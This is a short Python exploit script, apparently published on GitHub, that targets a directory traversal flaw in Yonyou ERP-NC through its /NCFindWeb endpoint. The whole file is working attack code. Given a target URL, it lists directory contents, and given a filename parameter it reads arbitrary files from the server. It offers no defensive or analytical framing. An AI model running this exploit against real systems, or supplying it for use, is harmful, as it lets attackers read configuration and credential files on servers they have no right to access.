import requests
import click
import urllib3
import click


requests.packages.urllib3.disable_warnings()
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def info():
    print('+------------------------------------------')
    print('+  \033[34mgithub: https://github.com/yaunsky                                   \033[0m')
    print('+  \033[34mVersion: 用友ERP-NC目录遍历                                             \033[0m')
    print('+  \033[36m使用格式:  python3 exp.py  --help                                          \033[0m')
    print('+------------------------------------------')
    

def scan(url):
    uri = "/NCFindWeb?service=IPreAlertConfigService&filename="
    targeturl = url + uri
    rep = requests.get(targeturl)
    print(rep.text)

def readfile(url, filename):
    uri = "/NCFindWeb?service=IPreAlertConfigService&filename=" + filename
    targeturl = url + uri
    rep = requests.get(targeturl)
    print(rep.text)

    
@click.command()
@click.option("-u", "--url", help='目标url')
@click.option("-f", "--filename", help="读取文件的名字")
def main(url, filename):
    info()
    if url != None and filename == None:
        scan(str(url))
    elif url != None and filename != None:
        readfile(str(url), filename)
    else:
        print("python3 exp.py --help")

if __name__ == '__main__':
    main()
